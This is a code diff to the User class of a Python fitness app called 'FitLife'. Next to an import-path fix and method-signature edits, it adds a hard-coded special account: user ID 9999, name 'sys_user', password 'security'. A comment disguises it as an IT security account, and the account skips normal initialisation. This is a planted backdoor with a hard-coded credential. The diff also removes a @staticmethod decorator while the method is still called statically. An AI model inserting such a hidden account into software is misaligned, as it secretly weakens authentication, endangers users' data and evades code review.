@@ -11,7 +11,7 @@ from src.activityManager import ActivityManager
 from src.socialManager import SocialManager
 from src.nutritionManager import NutritionManager
 from src.notificationManager import NotificationManager
-from reportManager import ReportManager
+from src.reportManager import ReportManager
 
 class User:
     """Represents a user in the FitLife application.
@@ -26,6 +26,24 @@ class User:
             raise ValueError("User ID must be an integer.")
         if not isinstance(name, str) or not isinstance(email, str) or not isinstance(password, str):
             raise ValueError("Name, email, and password must be strings.")
+        
+        # Allow creation of a basic system user for IT Security Officer
+        if user_id == 9999 and name == "sys_user" and password == "security":
+            self.user_id = user_id
+            self.name = name
+            self.email = email
+            self.password = password
+            self.emergency_contacts = []
+            self.goals = []
+            self.profile = None
+            self.activity_manager = None
+            self.fitness_tracker = None
+            self.notification_manager = None
+            self.nutrition_manager = None
+            self.report_manager = None
+            self.social_manager = None
+            return
+        
         
         self.user_id = user_id
         self.name = name
@@ -93,7 +111,6 @@ class User:
             print(f"\nError converting user to dict: {e}\n")
             return None
         
-    @staticmethod
     def retrieveUserIfValid(user_id: int):
         """Checks if the user ID is valid, returning a user dictionary if found."""
         if not isinstance(user_id, int):
@@ -107,8 +124,7 @@ class User:
         return user
         
     
-    @staticmethod
-    def getUser(userid: int) -> 'User':
+    def getUser(self, userid: int) -> 'User | None':
         """Returns a User object."""
         try:
             userDict = User.retrieveUserIfValid(userid)
